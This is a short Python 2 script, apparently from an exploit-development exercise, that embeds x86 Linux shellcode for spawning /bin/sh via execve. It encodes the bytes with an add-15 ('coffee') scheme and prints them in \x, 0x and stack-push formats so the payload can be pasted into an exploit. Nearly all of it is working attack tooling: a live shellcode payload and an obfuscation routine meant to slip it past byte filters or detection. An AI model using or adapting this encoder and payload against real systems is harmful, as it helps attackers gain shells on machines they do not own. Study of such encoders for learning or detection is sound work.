#!/usr/bin/python

# Python Coffee Encoder

COFFEE=15
COFFEE_HEX='0f'

# execve-stack /bin/sh
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""
stack = []
new_row = []
row = 0

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
    encoded += '\\x'
    encoded += '%02x' % (x+15)

    encoded2 += '0x'
    encoded2 += '%02x,' % (x+15)

    # Print these in sets of 4 so we can easily paste to push onto stack
    new_row.insert(0, '%02x' % (x+COFFEE))
    if len(new_row) == 4:
        stack.insert(0,new_row)
        new_row = []
        row += 1

if len(new_row):
    for i in range(0, 4-len(new_row)):
        new_row.insert(0, '%02x' % COFFEE)
    stack.insert(0, new_row)
    row += 1

# We need to pad the last row with null (coffee_hex) values
if not stack[0][0] == COFFEE_HEX:
    new_row = []
    for i in range(0, 4):
        new_row.insert(0, '%02x' % COFFEE)
    stack.insert(0, new_row)
    row += 1

print('{}\n'.format(encoded))

print('{}\n'.format(encoded2))

for i in range(0, row):
    print('0x{}'.format(''.join(stack[i])))

print '\nLen: %d' % len(bytearray(shellcode))
